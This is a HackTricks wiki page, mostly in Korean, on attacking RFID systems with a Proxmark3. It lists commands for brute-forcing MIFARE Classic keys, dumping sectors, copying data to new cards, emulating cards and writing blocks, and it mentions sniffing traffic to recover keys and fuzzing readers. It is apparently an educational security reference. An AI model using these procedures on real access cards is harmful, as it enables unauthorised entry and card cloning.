# Proxmark 3

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}

***

## Proxmark3로 RFID 시스템 공격하기

가장 먼저 해야 할 일은 [**Proxmark3**](https://proxmark.com)를 가지고 [**소프트웨어와 그 의존성 설치하기**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)[**s**](https://github.com/Proxmark/proxmark3/wiki/Kali-Linux)입니다.

### MIFARE Classic 1KB 공격하기

**16개의 섹터**가 있으며, 각 섹터는 **4개의 블록**을 가지고 있고 각 블록은 **16B**를 포함합니다. UID는 섹터 0 블록 0에 있으며 (변경할 수 없습니다).\
각 섹터에 접근하려면 **2개의 키** (**A**와 **B**)가 필요하며, 이 키는 **각 섹터의 블록 3**에 저장됩니다 (섹터 트레일러). 섹터 트레일러는 또한 **읽기 및 쓰기** 권한을 부여하는 **접근 비트**를 저장합니다.\
2개의 키는 첫 번째 키를 알고 있으면 읽기 권한을 부여하고 두 번째 키를 알고 있으면 쓰기 권한을 부여하는 데 유용합니다 (예를 들어).

여러 가지 공격을 수행할 수 있습니다.
```bash
proxmark3> hf mf #List attacks

proxmark3> hf mf chk *1 ? t ./client/default_keys.dic #Keys bruteforce
proxmark3> hf mf fchk 1 t # Improved keys BF

proxmark3> hf mf rdbl 0 A FFFFFFFFFFFF # Read block 0 with the key
proxmark3> hf mf rdsc 0 A FFFFFFFFFFFF # Read sector 0 with the key

proxmark3> hf mf dump 1 # Dump the information of the card (using creds inside dumpkeys.bin)
proxmark3> hf mf restore # Copy data to a new card
proxmark3> hf mf eload hf-mf-B46F6F79-data # Simulate card using dump
proxmark3> hf mf sim *1 u 8c61b5b4 # Simulate card using memory

proxmark3> hf mf eset 01 000102030405060708090a0b0c0d0e0f # Write those bytes to block 1
proxmark3> hf mf eget 01 # Read block 1
proxmark3> hf mf wrbl 01 B FFFFFFFFFFFF 000102030405060708090a0b0c0d0e0f # Write to the card
```
Proxmark3는 **태그와 리더 간의 통신을 도청**하여 민감한 데이터를 찾는 등의 다른 작업을 수행할 수 있습니다. 이 카드에서는 통신을 스니핑하고 사용된 키를 계산할 수 있습니다. 왜냐하면 **사용된 암호화 작업이 약하기** 때문에 평문과 암호문을 알고 있으면 이를 계산할 수 있습니다(`mfkey64` 도구).

### Raw Commands

IoT 시스템은 때때로 **브랜드가 없거나 상업적이지 않은 태그**를 사용합니다. 이 경우 Proxmark3를 사용하여 태그에 사용자 정의 **원시 명령을 전송**할 수 있습니다.
```bash
proxmark3> hf search UID : 80 55 4b 6c ATQA : 00 04
SAK : 08 [2]
TYPE : NXP MIFARE CLASSIC 1k | Plus 2k SL1
proprietary non iso14443-4 card found, RATS not supported
No chinese magic backdoor command detected
Prng detection: WEAK
Valid ISO14443A Tag Found - Quiting Search
```
이 정보를 통해 카드에 대한 정보와 카드와 통신하는 방법을 검색할 수 있습니다. Proxmark3는 다음과 같은 원시 명령을 전송할 수 있습니다: `hf 14a raw -p -b 7 26`

### Scripts

Proxmark3 소프트웨어에는 간단한 작업을 수행하는 데 사용할 수 있는 **자동화 스크립트**의 미리 로드된 목록이 포함되어 있습니다. 전체 목록을 검색하려면 `script list` 명령을 사용하십시오. 다음으로, `script run` 명령을 사용하고 스크립트의 이름을 입력하십시오:
```
proxmark3> script run mfkeys
```
You can create a script to **fuzz tag readers**, so copying the data of a **valid card** just write a **Lua script** that **randomize** one or more random **bytes** and check if the **reader crashes** with any iteration.

**Try Hard Security Group**

<figure><img src="/.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>

{% embed url="https://discord.gg/tryhardsecurity" %}


{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}
